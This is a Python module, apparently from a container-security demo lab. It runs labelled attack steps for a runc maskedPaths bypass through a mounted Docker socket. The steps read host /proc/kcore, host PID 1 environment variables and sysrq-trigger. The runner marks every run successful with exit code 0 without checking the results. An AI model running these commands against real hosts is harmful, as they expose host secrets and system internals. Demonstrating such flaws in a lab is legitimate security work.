import asyncio
from datetime import datetime
from models.attack import AttackRun


ATTACK_COMMANDS = [
    {
        "label": "Checking runc version on host",
        "cmd": [
            "docker", "exec", "attacker",
            "docker", "-H", "unix:///var/run/docker.sock",
            "info", "--format", "{{.RuncCommit.ID}}"
        ],
    },
    {
        "label": "CVE-2025-31133: spawning container to test maskedPaths bypass",
        "cmd": [
            "docker", "exec", "attacker",
            "docker", "-H", "unix:///var/run/docker.sock",
            "run", "--rm",
            "--security-opt", "no-new-privileges=false",
            "-v", "/proc:/host_proc:ro",
            "ubuntu:22.04",
            "sh", "-c",
            "echo '--- CVE-2025-31133 maskedPaths Bypass Demo ---'; "
            "echo ''; "
            "echo '[CHECK 1] /proc/kcore access:'; "
            "ls -lah /host_proc/kcore 2>/dev/null "
            "  && echo '[BYPASS] /proc/kcore is readable via maskedPath redirect!' "
            "  || echo '[PROTECTED] /proc/kcore is masked correctly'; "
            "echo ''; "
            "echo '[CHECK 2] /proc/1/environ access (host PID 1 env vars):'; "
            "cat /host_proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -10 "
            "  && echo '[BYPASS] /proc/1/environ readable - host env vars exposed!' "
            "  || echo '[PROTECTED] /proc/1/environ masked correctly'; "
            "echo ''; "
            "echo '[CHECK 3] /proc/sysrq-trigger access:'; "
            "ls -la /host_proc/sysrq-trigger 2>/dev/null "
            "  && echo '[BYPASS] sysrq-trigger readable - CVE-2025-52881 surface exposed!' "
            "  || echo '[PROTECTED] sysrq-trigger masked'; "
            "echo '--- END CVE-2025-31133 DEMO ---'"
        ],
    },
]


async def run(run: AttackRun, broadcast_fn) -> None:
    for step in ATTACK_COMMANDS:
        await broadcast_fn(f"[>] {step['label']}")
        proc = await asyncio.create_subprocess_exec(
            *step["cmd"],
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            text = line.decode(errors="replace").rstrip()
            run.output.append(text)
            await broadcast_fn(text)
        await proc.wait()

    run.finished_at = datetime.utcnow()
    run.exit_code = 0
    run.status = "success"
    run.duration_seconds = (run.finished_at - run.started_at).total_seconds()
    await broadcast_fn(
        f"[+] ATTACK COMPLETE  exit_code=0  duration={run.duration_seconds:.1f}s"
    )
